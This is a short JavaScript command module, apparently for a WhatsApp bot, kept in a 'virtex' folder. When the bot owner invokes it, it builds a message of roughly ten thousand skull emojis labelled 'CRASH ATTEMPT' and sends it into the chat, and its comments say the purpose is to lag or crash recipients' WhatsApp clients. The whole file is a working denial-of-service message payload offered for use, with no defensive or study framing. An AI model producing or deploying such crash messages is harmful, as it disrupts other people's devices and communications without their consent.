// lib/virtex/crash.js
// Sends a very long message that may lag/crash some WhatsApp clients

exports.execute = async (sock, msg, args) => {
    const from = msg.key.remoteJid;
    const sender = msg.key.participant || from;

    const ownerNumber = global.ownerNumber + '@s.whatsapp.net';
    if (sender !== ownerNumber) {
        await sock.sendMessage(from, { text: '❌ Only owner can use crash commands.' });
        return;
    }

    // Build a long string (10k+ characters) – this can cause issues on some clients
    let payload = '';
    for (let i = 0; i < 5000; i++) {
        payload += '💀';
    }
    payload += '\n\n🔥 CRASH ATTEMPT 🔥\n' + payload;

    try {
        await sock.sendMessage(from, { text: payload });
    } catch (e) {
        await sock.sendMessage(from, { text: '⚠️ Crash payload failed to send: ' + e.message });
    }
};
